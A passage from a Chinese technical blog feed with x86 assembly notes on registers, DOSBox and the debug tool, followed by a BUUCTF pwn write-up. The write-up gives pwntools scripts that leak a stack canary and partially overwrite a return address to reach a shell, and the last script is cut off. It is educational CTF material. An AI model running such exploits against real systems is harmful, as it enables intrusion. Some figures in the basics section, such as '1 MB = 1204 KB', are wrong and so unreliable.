bxmov <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> al<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li><p>在 <code>mov</code> 指令中，*<code>[]</code> 表示一个内存单元，<code>[0]</code> 表示这个内存单元的偏移地址为 0，而这个内存单元的段地址默认存放在 <code>DS</code> 中*</p></li><li><p><em>8086CPU 不支持直接将数据送入段寄存器（硬件设计的问题）</em>，因此必须先将数据送入通用寄存器，然后再从通用寄存器送入段寄存器（<strong>数据 –&gt; 通用寄存器 –&gt; 段寄存器</strong>）</p></li></ul><hr><h3 id="SS-和-SP"><a href="#SS-和-SP" class="headerlink" title="SS 和 SP"></a>SS 和 SP</h3><blockquote><p><em>SS 用来存放栈顶的段地址，SP 用来存放栈顶的偏移地址</em>，<mark>任意时刻：SS:SP 指向栈顶元素</mark></p></blockquote><ul><li><p>当执行 <code>push</code> 和 <code>pop</code> 指令时，CPU 会从 SS 和 SP 中得到栈顶的地址</p></li><li><p>以 <code>push ax</code> 为例：</p><ol><li>首先 <code>SP = SP - 2</code>，SS:SP 指向当前新的栈顶位置（原栈顶的上方）</li><li>将 ax 中的内容送入 SS:SP 所指向的内存单元处</li></ol></li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_SS%E5%92%8CSP1.png" alt="x86汇编_SS和SP1.png"></p><ul><li>以 <code>pop ax</code> 为例：<ol><li>将 SS:SP 指向的内存单元处的数据送入 ax 中</li><li>然后 <code>SP = SP + 2</code>，SS:SP 指向当前新的栈顶位置（原栈顶的下方）</li></ol></li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_SS%E5%92%8CSP2.png" alt="x86汇编_SS和SP2.png"></p><blockquote><p>当栈为空时，例如栈空间为：<code>10000h ~ 1000Fh</code>：</p><ol><li>由于出栈、入栈以字（Word）为单位，因此<strong>当栈中只有一个元素时：SS &#x3D; 1000h、SP &#x3D; 0Eh</strong></li><li>栈为空相当于唯一的元素出栈，出栈后 <code>SP = SP + 2</code>，SP &#x3D; 0Eh + 2 &#x3D; 10h，因此<strong>当栈为空时：SS &#x3D; 1000h、SP &#x3D; 10h</strong>（即：<em>指向栈底下方的内存单元</em>）</li></ol></blockquote><blockquote><p>注意：执行 <code>pop</code> 后，<code>pop</code> 操作前的栈顶元素依然存在于内存单元中，只是已经不在栈中<br>等再次执行 <code>push</code> 后，向该内存单元中送入新的数据时，即可将其覆盖</p></blockquote><hr><h3 id="ES"><a href="#ES" class="headerlink" title="ES"></a>ES</h3><blockquote><p>附加段寄存器。存放当前执行程序中的一个辅助数据段的段地址</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 汇编语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> x86汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编基础知识</title>
      <link href="/posts/bfc7c122.html"/>
      <url>/posts/bfc7c122.html</url>
      
        <content type="html"><![CDATA[<h1 id="编译器"><a href="#编译器" class="headerlink" title="编译器"></a>编译器</h1><blockquote><p>可以将汇编指令转换成机器指令的翻译程序</p><p>程序员 –&gt; 汇编指令 –&gt; 编译器 –&gt; 机器码 –&gt; 计算机</p></blockquote><hr><h1 id="指令和数据"><a href="#指令和数据" class="headerlink" title="指令和数据"></a>指令和数据</h1><blockquote><p>指令和数据其实是应用上的概念。在内存或磁盘上，指令和数据没有任何的区别，都是以二进制信息的形式存储</p></blockquote><ul><li>例如，内存中的二进制信息：1000100111011000<ol><li>可以看成大小为 <code>89D8h</code> 的数据来处理</li><li>可以看成是指令 <code>mov ax, bx</code> 来执行</li></ol></li></ul><hr><h1 id="存储单元"><a href="#存储单元" class="headerlink" title="存储单元"></a>存储单元</h1><blockquote><p>存储器被划分为若干个单元，每个存储单元从 0 开始顺序编号</p></blockquote><ul><li><strong>微型机存储器的容量以 <mark>字节 (Byte) 作为最小单位</mark></strong><ol><li>1 个字节 (Byte) &#x3D; 8 个比特 (bit)</li><li>例如，<mark>一个存储器有 128 个存储单元，则它可以存储 128 个字节 (Byte)</mark></li></ol></li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%861.png" alt="x86汇编_基础知识1.png"></p><blockquote><p>1 KB &#x3D; 1024 B<br>1 MB &#x3D; 1204 KB<br>1 GB &#x3D; 1024 MB<br>1 TB &#x3D; 1024 GB</p></blockquote><hr><h1 id="CPU-对数据的读写"><a href="#CPU-对数据的读写" class="headerlink" title="CPU 对数据的读写"></a>CPU 对数据的读写</h1><blockquote><p>CPU 想要进行数据读写，需要三类信息：</p><ol><li>存储单元的地址（<em>地址信息</em>） —— <strong>地址总线</strong></li><li>器件的选择、读或写的命令（<em>控制信息</em>） —— <strong>控制总线</strong></li><li>读或写的数据（<em>数据信息</em>） —— <strong>数据总线</strong></li></ol></blockquote><ul><li>示例：CPU 从 3 号内存单元中读取数据的过程</li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_CPU%E5%AF%B9%E6%95%B0%E6%8D%AE%E7%9A%84%E8%AF%BB%E5%86%991.png" alt="x86汇编_CPU对数据的读写1.png"></p><hr><h2 id="地址总线"><a href="#地址总线" class="headerlink" title="地址总线"></a>地址总线</h2><blockquote><p>CPU 是通过地址总线来指定内存单元的</p><p><mark>地址总线上能传送多少个不同的信息，CPU 就能对多少个内存单元进行寻址</mark></p></blockquote><ul><li><p>若一个 CPU 有 N 根地址线，则可以说这个 CPU 的<strong>地址总线宽度</strong>为 N，最多可以寻址 $2 ^ {N}$ 个内存单元</p></li><li><p>示例：地址总线为 10 根的 CPU 向内存发出地址信息 11</p></li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_%E5%9C%B0%E5%9D%80%E6%80%BB%E7%BA%BF1.png" alt="x86汇编_地址总线1.png"></p><hr><h2 id="数据总线"><a href="#数据总线" class="headerlink" title="数据总线"></a>数据总线</h2><blockquote><p>实现 CPU 与内存或其他器件之间的数据传送</p><p><mark>数据总线的宽度决定了 CPU 和外界的数据传送速度</mark></p></blockquote><ul><li><p>8 根数据总线一次可以传输 8bit 二进制数据（一个字节）</p></li><li><p>示例：当 CPU 向内存写入数据 <code>89DF8h</code> 时</p></li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_%E6%95%B0%E6%8D%AE%E6%80%BB%E7%BA%BF1.png" alt="x86汇编_数据总线1.png"></p><ol><li><p>8086CPU 地址总线为 16 位，可以一次传输 16bit 数据，因此 <code>89D8h</code> 可以一次传输完成</p></li><li><p>如果是 <code>8088CPU</code> 的话，地址总线只有 8 位，一次就只能传输 8bit，因此需要传输两次，先传送 <code>D8h</code>，再传送 <code>89h</code></p></li></ol><hr><h2 id="控制总线"><a href="#控制总线" class="headerlink" title="控制总线"></a>控制总线</h2><blockquote><p>实现 CPU 对外部器件的控制</p><p><mark>有多少根控制总线，就意味着 CPU 提供了多少种对外部器件的控制</mark></p></blockquote><hr><h1 id="搭建-DOSBox-debug-环境"><a href="#搭建-DOSBox-debug-环境" class="headerlink" title="搭建 DOSBox debug 环境"></a>搭建 DOSBox debug 环境</h1><p>下载 DOSBox：<a href="https://sourceforge.net/projects/dosbox/files/dosbox/0.74-3/DOSBox0.74-3-win32-installer.exe/download">Download DOSBox0.74-3-win32-installer.exe (DOSBox) (sourceforge.net)</a></p><p>双击安装</p><p>在 DOSBox 的安装目录下双击 <code>DOSBox 0.74-3 Options.bat</code> 文件，弹出 <code>dosbox-0.74-3.conf</code> 文件</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_DOSBox%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA1.png" alt="x86汇编_DOSBox环境搭建1.png"></p><p>在 <code>dosbox-0.74-3.conf</code> 的最后，加上下面两句 （尽量不要加中文注释，否则打开 DOSBox 会报错，无法进入到指定文件夹）：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mount</span> c d:<span class="token punctuation">\</span>masmc:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这两句的意思是：<br>将本机的 <code>d:\masm</code> 作为 DOSBox 环境的 C 盘，并进入到 DOSBox 的 C 盘目录下 （作为 DOSBox 环境 C 盘的 <code>d:\masm</code> 目录可自己设定，尽量不要有中文）</p><p>保存后，打开 DOSBox，显示本地目录被成功挂载为 C 盘</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_DOSBox%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA2.png" alt="x86汇编_DOSBox环境搭建2.png"></p><p>另外，DOSBox 默认的运行窗口特别小，字体也很小</p><p>可以通过 <code>dosbox-0.74-3.conf</code> 自定义窗口尺寸，找到如下位置： （大概在 29 行）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">windowresolution</span><span class="token operator">=</span>original<span class="token assign-left variable">output</span><span class="token operator">=</span>surface<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>修改为：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">windowresolution</span><span class="token operator">=</span>1024x768<span class="token assign-left variable">output</span><span class="token operator">=</span>opengl<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>重新打开 DOSBox：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_DOSBox%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA4.png" alt="x86汇编_DOSBox环境搭建4.png"></p><p>然后还需要下载汇编、链接程序</p><p>下载地址：<a href="https://pan.baidu.com/s/17h1TO4Uy5sZl1dgMza7UHA?pwd=1314">DOSBox 编译链接相关程序</a></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_DOSBox%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA3.png" alt="x86汇编_DOSBox环境搭建3.png"></p><p>主要是 <code>MASM.EXE</code>、<code>LINK.EXE</code>、<code>DEBUG.EXE</code> （<code>ML.EXE</code> 为 <code>MASM.EXE</code> + <code>LINK.EXE</code>）</p><p><code>MASM.EXE</code>：汇编程序，用于汇编源程序 <code>.asm</code>，得到目标程序 <code>.obj</code><br><code>LINK.EXE</code>：链接程序，用于链接目标程序，得到可执行程序 <code>.exe</code><br><code>DEBUG.EXE</code>：调试程序，用于调试可执行程序</p><hr><h1 id="搭建-VScode-debug-环境"><a href="#搭建-VScode-debug-环境" class="headerlink" title="搭建 VScode debug 环境"></a>搭建 VScode debug 环境</h1><blockquote><p>VScode 提供了 MASM 和 DOSBox 环境的插件，并且 VScode 本身也是一款十分出色的编辑器，提供了各种语法高亮，可以很方便的搭建 debug 环境</p></blockquote><p>打开 VScode 中的扩展栏，搜索 masm，找到 <code>MASM/TASM</code> 这个插件，安装</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_%E6%90%AD%E5%BB%BAVScode%20debug%E7%8E%AF%E5%A2%831.png" alt="x86汇编_搭建VScode debug环境1.png"></p><p>这个插件会将 DOSBox 以及汇编编译器 MASM 都安装好，也不需要我们再去挂载之类的操作了</p><p>写完代码后，直接右键运行或者调试</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_%E6%90%AD%E5%BB%BAVScode%20debug%E7%8E%AF%E5%A2%832.png" alt="x86汇编_搭建VScode debug环境2.png"></p><hr><h1 id="常用的-debug-指令"><a href="#常用的-debug-指令" class="headerlink" title="常用的 debug 指令"></a>常用的 debug 指令</h1><table><thead><tr><th align="left">参数</th><th align="left">意义</th></tr></thead><tbody><tr><td align="left"><code>r</code></td><td align="left">查看、更改 cpu 寄存器内容</td></tr><tr><td align="left"><code>d</code></td><td align="left">查看内存中内容</td></tr><tr><td align="left"><code>e</code></td><td align="left">改写内存中内容</td></tr><tr><td align="left"><code>u</code></td><td align="left">将内存中机器指令翻译成汇编指令</td></tr><tr><td align="left"><code>a</code></td><td align="left">以汇编格式在内存中写入一条指令</td></tr><tr><td align="left"><code>t</code></td><td align="left">单步执行，一次只执行一条机器指令</td></tr><tr><td align="left"><code>p</code></td><td align="left">类似 t 命令，不过遇到子程序调用的时候不会进入子程序逐条执行，而是直接执行完子程序代码。另外，在遇到 loop 循环指令时，会直接执行到 CX&#x3D;0</td></tr><tr><td align="left"><code>g</code></td><td align="left">该命令后面可以跟地址和断点，格式为：<code>g [=address] [breakpoints]</code>，运行到内存指定位置的代码后暂停，如果不加参数默认是从当前 IP 运行到程序结束。可以用来跳过 loop 循环</td></tr><tr><td align="left"><code>q</code></td><td align="left">退出 debug</td></tr></tbody></table><hr><h2 id="r-命令"><a href="#r-命令" class="headerlink" title="r 命令"></a>r 命令</h2><ol><li>输入 <code>r</code> 后回车，会显示所有寄存器的数值</li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_r%E5%91%BD%E4%BB%A41.png" alt="x86汇编_r命令1.png"></p><ol start="2"><li>输入 <code>r ax</code> 后回车，会显示当前 <code>ax</code> 中的数据，在 <code>&#39;:&#39;</code> 后面输入内容后回车，即可修改 <code>ax</code> 的数据（十六进制）</li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_r%E5%91%BD%E4%BB%A42.png" alt="x86汇编_r命令2.png"></p><hr><h2 id="d-命令"><a href="#d-命令" class="headerlink" title="d 命令"></a>d 命令</h2><ol><li>输入 <code>d</code> 后回车，显示内存数据，<strong>区域地址为上次查看的位置继续往后</strong>的内存数据</li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_d%E5%91%BD%E4%BB%A41.png" alt="x86汇编_d命令1.png"></p><ol start="2"><li>输入 <code>d 1000:00</code> 后回车，显示段地址为 1000，偏移地址为 0 的内存数据</li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_d%E5%91%BD%E4%BB%A42.png" alt="x86汇编_d命令2.png"></p><ol start="3"><li>输入 <code>d 1000:00 ff</code> 后回车，显示段地址为 1000，偏移地址为 0 到 ff 的内存数据</li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_d%E5%91%BD%E4%BB%A43.png" alt="x86汇编_d命令3.png"></p><hr><h2 id="e-命令"><a href="#e-命令" class="headerlink" title="e 命令"></a>e 命令</h2><ol><li>输入 <code>e 1000:00 23 11 22 66</code> 后回车，可以一次性修改段地址为 1000，偏移地址为 0 的 4 个数据的值为 23、11、22、66（数据的个数自己可以随意选择）</li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_e%E5%91%BD%E4%BB%A41.png" alt="x86汇编_e命令1.png"></p><ol start="2"><li>输入 <code>e 1000:00</code> 后回车，可以根据提示按地址顺序一个一个修改数据的值。<code>&#39;.&#39;</code> 前面的数表示原来的数据，在 <code>&#39;.&#39;</code> 后面输入修改后的数据，然后按<strong>空格</strong>继续修改下一个地址的数据，最后按<strong>回车</strong>结束修改，例如修改为 1、2、3、4</li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_e%E5%91%BD%E4%BB%A42.png" alt="x86汇编_e命令2.png"></p><hr><h2 id="u-命令"><a href="#u-命令" class="headerlink" title="u 命令"></a>u 命令</h2><ol><li>输入 <code>u</code> 后回车，可以将<strong>上次查看的区域地址位置继续往后</strong>的内存地址上的机器码翻译为汇编指令，并显示出来</li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_u%E5%91%BD%E4%BB%A41.png" alt="x86汇编_u命令1.png"></p><ol start="2"><li>输入 <code>u 1000:00</code> 后回车，可以将段地址为 1000，偏移地址为 0 的内存地址上的机器码翻译为汇编指令，并显示出来</li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_u%E5%91%BD%E4%BB%A42.png" alt="x86汇编_u命令2.png"></p><hr><h2 id="a-命令"><a href="#a-命令" class="headerlink" title="a 命令"></a>a 命令</h2><ol><li>输入 <code>a 1000:00</code> 后回车，可以向段地址为 1000，偏移地址为 0 的内存地址上输入汇编指令，输入完成后，继续<strong>回车</strong>结束</li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_a%E5%91%BD%E4%BB%A41.png" alt="x86汇编_a命令1.png"></p><hr><h2 id="t-命令"><a href="#t-命令" class="headerlink" title="t 命令"></a>t 命令</h2><ol><li>输入 <code>t</code> 后回车，即可从 <code>CS:IP</code> 所指向的地址取出一条指令单步执行（<em>需要提前指定 CS 和 IP 的值</em>）</li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_t%E5%91%BD%E4%BB%A41.png" alt="x86汇编_t命令1.png"></p><hr><h2 id="p-命令"><a href="#p-命令" class="headerlink" title="p 命令"></a>p 命令</h2><ol><li>对于存在 loop 循环的程序，先单步执行到 loop 指令，使用 <code>p</code> 命令可以直接执行到 CX &#x3D; 0 跳出循环</li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_p%E5%91%BD%E4%BB%A41.png" alt="x86汇编_p命令1.png"></p><hr><h2 id="g-命令"><a href="#g-命令" class="headerlink" title="g 命令"></a>g 命令</h2><ol><li>该命令后面可以跟地址和断点，运行到内存指定位置的代码，也可以用 <code>g</code> 命令来跳过 loop 循环</li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_g%E5%91%BD%E4%BB%A41.png" alt="x86汇编_g命令1.png"></p><hr><h1 id="debug-中的标志寄存器"><a href="#debug-中的标志寄存器" class="headerlink" title="debug 中的标志寄存器"></a>debug 中的标志寄存器</h1><blockquote><p>在 DEBUG 中，标志寄存器是按照有意义的各个标志位单独表示的</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/x86%E6%B1%87%E7%BC%96_debug%E4%B8%AD%E7%9A%84%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A81.png" alt="x86汇编_debug中的标志寄存器1.png"></p><ul><li>在 DEBUG 中对已知标志位的表示：</li></ul><table><thead><tr><th align="left">标志</th><th align="left">值为 1 的标记</th><th align="left">值为 0 的标记</th></tr></thead><tbody><tr><td align="left"><code>OF</code></td><td align="left">OV</td><td align="left">NV</td></tr><tr><td align="left"><code>DF</code></td><td align="left">DN</td><td align="left">UP</td></tr><tr><td align="left"><code>SF</code></td><td align="left">NG</td><td align="left">PL</td></tr><tr><td align="left"><code>ZF</code></td><td align="left">ZR</td><td align="left">NZ</td></tr><tr><td align="left"><code>PF</code></td><td align="left">PE</td><td align="left">PO</td></tr><tr><td align="left"><code>CF</code></td><td align="left">CY</td><td align="left">NC</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 汇编语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> x86汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【BUUCTF】linkctf_2018.7_babypie1</title>
      <link href="/posts/89729f60.html"/>
      <url>/posts/89729f60.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p><mark>通过栈溢出覆盖 canary 最后一字节 <code>b&#39;\x00&#39;</code>，再利用 <code>printf()</code> 将 canary 的余下七字节输出，从而绕过 canary 保护</mark></p></li><li><p>利用 <code>partial write</code> 漏洞爆破 PIE 地址随机化</p></li></ul><hr><p><a href="https://buuoj.cn/challenges#linkctf_2018.7_babypie">【BUUCTF】linkctf_2018.7_babypie1</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>分析文件：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/BUUCTF-babypie1.png" alt="BUUCTF-babypie1.png"></p><p>权限都开了</p><p>在 IDA 下分析：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/BUUCTF-babypie2.png" alt="BUUCTF-babypie2.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/BUUCTF-babypie3.png" alt="BUUCTF-babypie3.png"></p><p>观察 <code>buf</code> 在栈中的情况：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/BUUCTF-babypie4.png" alt="BUUCTF-babypie4.png"></p><p>在 <code>buf</code> 处存在溢出，不过有 canary 保护</p><p>查看字符串：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/BUUCTF-babypie5.png" alt="BUUCTF-babypie5.png"></p><p>存在 <code>&quot;/bin/sh&quot;</code></p><p>发现后门函数：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/BUUCTF-babypie6.png" alt="BUUCTF-babypie6.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/BUUCTF-babypie7.png" alt="BUUCTF-babypie7.png"></p><p>第一个输入 <code>read(0, buf, 0x30uLL)</code> 虽然无法溢出，但是 <code>printf(&quot;Hello %s:\n&quot;, buf)</code> 可以打印出 <code>buf</code> 的内容</p><p>由于 canary 的最后一字节为 <code>b&#39;\x00&#39;</code>，会截断 <code>printf()</code> 的输出<br>因此可以考虑控制 <code>buf</code> 的长度，将 canary 的最后一字节 <code>b&#39;\x00&#39;</code> 覆盖掉，于是 <code>printf()</code> 就会将 canary 的内容输出出来<br>获得 canary 的值之后就可以通过第二个 <code>read(0, buf, 0x60uLL)</code> 来溢出了</p><p>但是程序开启了 PIE 地址随机化，因此 <code>0xA42</code> 并不是后门函数的真实地址</p><p>不过由于 <code>partial write</code>（部分写入）的原理，地址的后三位与真实地址是相同的<br>也就是说真实地址是 <code>0xnA42</code>，<code>n</code> 未知，但 <code>n</code> 取值在 <code>0 ~ 15</code> 之间<br>所以可以进行暴力破解真实地址（或者直接使用 <code>0x0A42</code> 进行碰撞，有概率碰撞正确）</p><p>另外，由于后门地址和 ret_addr 的地址只有后两位不一样，所以覆盖返回地址的时候直接填上 <code>b&#39;\x42&#39;</code> 也可以，只修改地址的最后两位</p><hr><h1 id="脚本一"><a href="#脚本一" class="headerlink" title="脚本一"></a>脚本一</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/linkctf_2018.7_babypie1/babypie"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在kali的路径</span><span class="token keyword">else</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node4.buuoj.cn"</span><span class="token punctuation">,</span> <span class="token number">25143</span><span class="token punctuation">)</span>  <span class="token comment"># 题目的远程端口</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Input your Name:\n"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x30</span> <span class="token operator">-</span> <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token number">0x1</span><span class="token punctuation">)</span>  <span class="token comment"># 0x30 - 0x8 到达 canary 的地址，0x30 - 0x8 + 0x1 为 canary 的最后一字节 b'\x00' 的地址</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"</span><span class="token punctuation">)</span>tmp <span class="token operator">=</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>  <span class="token comment"># 接收 printf 输出的七字节 canary 数据</span>canary <span class="token operator">=</span> <span class="token string">b'\x00'</span> <span class="token operator">+</span> tmp  <span class="token comment"># 加上最后一字节 b'\x00' 补齐 canary</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"canary："</span><span class="token punctuation">,</span> canary<span class="token punctuation">)</span>payload<span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x30</span> <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> canary <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token string">b'\x42'</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果一"><a href="#结果一" class="headerlink" title="结果一"></a>结果一</h1><blockquote><p>flag{06ccfdaa-2392-4671-b0c0-5fb5bdf5c8cd}</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/BUUCTF-babypie8.png" alt="BUUCTF-babypie8.png"></p><hr><h1 id="脚本二"><a href="#脚本二" class="headerlink" title="脚本二"></a>脚本二</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/linkctf_2018.7_babypie1/babypie"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在kali的路径</span><span class="token keyword">else</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node4.buuoj.cn"</span><span class="token punctuation">,</span> <span class="token number">25143</span><span class="token punctuation">)</span>  <span class="token comment"># 题目的远程端口</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Input your Name:\n"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x30</span> <span class="token operator">-</span> <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token number">0x1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"</span><span class="token punctuation">)</span>tmp <span class="token operator">=</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> <span class="token string">b'\x00'</span> <span class="token operator">+</span> tmp<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"canary："</span><span class="token punctuation">,</span> canary<span class="token punctuation">)</span><span class="token comment"># 爆破后门函数地址</span>address <span class="token operator">=</span> <span class="token string">b'\x42'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    address <span class="token operator">+=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0x10</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">0xa</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  